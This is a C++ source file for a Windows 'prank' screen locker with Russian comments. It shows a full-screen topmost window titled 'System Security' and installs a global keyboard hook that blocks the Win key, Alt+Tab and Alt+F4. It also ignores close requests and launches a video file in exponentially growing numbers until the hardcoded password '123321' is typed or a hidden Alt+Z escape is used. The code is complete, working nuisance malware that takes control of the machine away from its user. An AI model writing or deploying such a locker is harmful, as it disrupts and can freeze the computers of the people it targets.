#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <cstdio>
#include <cmath>
#include <shellapi.h>

const std::wstring CORRECT_PASSWORD = L"123321";
bool g_running = true;
std::wstring g_mkvPath = L"";

// Поток бесконечного спама видео в геометрической прогрессии (1, 2, 4, 8, 16...)
DWORD WINAPI SpamThread(LPVOID lpParam) {
    // Ждем 6 секунд («плывущий» экран)
    Sleep(6000);

    int count = 1;
    while (g_running) {
        for (int i = 0; i < count && g_running; ++i) {
            ShellExecuteW(NULL, L"open", g_mkvPath.c_str(), NULL, NULL, SW_SHOW);
            Sleep(80);
        }
        Sleep(2000);
        count *= 2; // Умножение в 2 раза с каждым шагом
    }
    return 0;
}

// Оконная процедура: рисуем эффект волн в первые 6 секунд и обрабатываем поле ввода
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HFONT hFontInput = NULL;
    static HWND hEditPassword = NULL;
    static DWORD startTime = GetTickCount();

    switch (msg) {
    case WM_CREATE: {
        hFontInput = CreateFontW(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI");
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int inW = 300, inH = 40;
        hEditPassword = CreateWindowW(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD | ES_CENTER | ES_AUTOHSCROLL, 
            (w - inW) / 2, h / 2 - 20, inW, inH, hwnd, (HMENU)101, NULL, NULL);
        SendMessage(hEditPassword, WM_SETFONT, (WPARAM)hFontInput, TRUE);
        SetFocus(hEditPassword);

        // Запуск потока спама
        CreateThread(NULL, 0, SpamThread, NULL, 0, NULL);
        break;
    }

    // Рендеринг эффекта «плывущего» экрана и черного фона
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        // Заливка черным
        HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
        RECT rect = {0, 0, w, h};
        FillRect(hdc, &rect, hBrush);
        DeleteObject(hBrush);

        float elapsed = (GetTickCount() - startTime) / 1000.0f;
        if (elapsed < 6.0f) {
            // Эффект искажения (волны)
            for (int y = 0; y < h; y += 15) {
                int offsetX = static_cast<int>(std::sin(elapsed * 5.0f + y * 0.05f) * 20.0f * (elapsed / 6.0f));
                HBRUSH waveBrush = CreateSolidBrush(RGB(20, 20 + (y % 40), 40));
                RECT waveRect = {offsetX, y, w + offsetX, y + 8};
                FillRect(hdc, &waveRect, waveBrush);
                DeleteObject(waveBrush);
            }
        }

        EndPaint(hwnd, &ps);
        break;
    }

    case WM_TIMER: {
        InvalidateRect(hwnd, NULL, FALSE); // Перерисовка для анимации волн
        break;
    }

    case WM_COMMAND: {
        if (LOWORD(wParam) == 101 && HIWORD(wParam) == EN_CHANGE) {
            wchar_t buf[256];
            GetWindowTextW(hEditPassword, buf, 256);
            if (std::wstring(buf) == CORRECT_PASSWORD) {
                g_running = false;
                PostQuitMessage(0);
            }
        }
        break;
    }

    case WM_CLOSE:
        return 0;

    case WM_DESTROY:
        if (hFontInput) DeleteObject(hFontInput);
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// Низкоуровневый перехватчик клавиатуры: ловит Alt + Z для экстренного выхода и блокирует системные клавиши
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;

        // Проверка на Alt + Z для мгновенного сноса
        if ((pKbd->flags & LLKHF_ALTDOWN) != 0 && (pKbd->vkCode == 'Z' || pKbd->vkCode == 'z')) {
            ExitProcess(0); // Моментальное завершение всего процесса
        }

        // Блокировка Win, Alt+Tab, Alt+F4
        if (pKbd->vkCode == VK_LWIN || pKbd->vkCode == VK_RWIN) return 1;
        if ((pKbd->flags & LLKHF_ALTDOWN) != 0 && (pKbd->vkCode == VK_TAB || pKbd->vkCode == VK_F4)) return 1;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Поддержка аргумента для быстрого закрытия через батник
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1 && std::wstring(argv[1]) == L"bananchiki") {
        system("taskkill /f /im lockscreen.exe >nul 2>&1");
        LocalFree(argv);
        return 0;
    }
    LocalFree(argv);

    // Получаем путь к видео рядом с .exe
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring dir(exePath);
    size_t pos = dir.find_last_of(L"\\/");
    if (pos != std::wstring::npos) dir = dir.substr(0, pos);
    g_mkvPath = dir + L"\\UI\\Sounds\\Loading Background\\video.mkv";

    // Создание антидота bananchiki.bat
    std::wstring batPath = dir + L"\\bananchiki.bat";
    FILE* f = _wfopen(batPath.c_str(), L"w");
    if (f) {
        fwprintf(f, L"@echo off\ntaskkill /f /im lockscreen.exe >nul 2>&1\n");
        fclose(f);
    }

    const wchar_t CLASS_NAME[] = L"WinGlitchPrank";
    WNDCLASSW wc = {};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);

    RegisterClassW(&wc);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        CLASS_NAME,
        L"System Security",
        WS_POPUP | WS_VISIBLE,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    // Установка таймера для анимации волн (каждые 30 мс)
    SetTimer(hwnd, 1, 30, NULL);

    // Установка глобального хука на клавиатуру (ловит Alt+Z везде)
    HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
    system("taskkill /f /im wmplayer.exe >nul 2>&1");
    system("taskkill /f /im vlc.exe >nul 2>&1");
    system("taskkill /f /im mpv.exe >nul 2>&1");

    return 0;
}
